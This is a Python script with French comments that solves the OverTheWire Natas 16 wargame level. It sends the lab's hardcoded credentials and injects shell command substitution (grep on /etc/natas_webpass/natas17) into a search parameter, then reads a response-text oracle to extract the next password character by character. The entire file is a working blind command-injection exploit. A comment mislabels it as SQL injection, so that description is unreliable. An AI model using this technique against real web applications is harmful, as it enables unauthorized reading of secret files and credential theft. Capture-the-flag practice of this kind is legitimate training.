#!/usr/bin/python
# -*- coding: utf-8 -*-

import requests  # Gestion des requêtes
import string    # Gestion des chaîne caractères
import tqdm      # Afficher une barre de progression.

# Variable pour se connecter au site et valider la première demande de mot de passe.
url = "http://natas16.natas.labs.overthewire.org/"
user = "natas16"
passw = 'TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V'

# Connexion avec le nom d'utilisateur, ainsi que le mot de pass
response = requests.get(url, auth=(user, passw))
session1 = requests.Session()

# Création de la liste de tout les caractères à test pour trouver le mot de passe pendant l'injection.
characters = ''.join([string.ascii_letters,string.digits])

# On test toutes les lettres
chracters_used_in_passwd = []
for c in tqdm.tqdm(characters):  
    # Injection Blind SQL
    response = requests.get(url + f"?needle=Africans$(grep {c} /etc/natas_webpass/natas17)",
                      auth = (user, passw))  
    # Si il trouve une lettre il y aura pas le bon mot dans le dictionnaire dans la lettre est bonne
    if 'Africans' not in response.text:  
        chracters_used_in_passwd.append(c)  
print("caractère utilisé dans le mot de passe: ", chracters_used_in_passwd)

# Restoration du mot de passe
restored_passw = ""
# On test toutes les positions des lettres si on trouve les bonnes lettres à la bonne position c'est bon.
for i in tqdm.tqdm(range(32)):  
    for c in chracters_used_in_passwd:
        tmp_passw = restored_passw + c
        # Toujours la même méthode avec un expression régulière.
        response = requests.get(url + f"?needle=Africans$(grep ^{tmp_passw} /etc/natas_webpass/natas17)",
                          auth = (user, passw))   
        # Même chose, si on trouve par le bon mot de passe Africans alors on a trouvé une partie ou tout le mot de passe.    
        if 'Africans' not in response.text:  
            restored_passw = tmp_passw
print("Le mot de passe finale est : ", restored_passw)
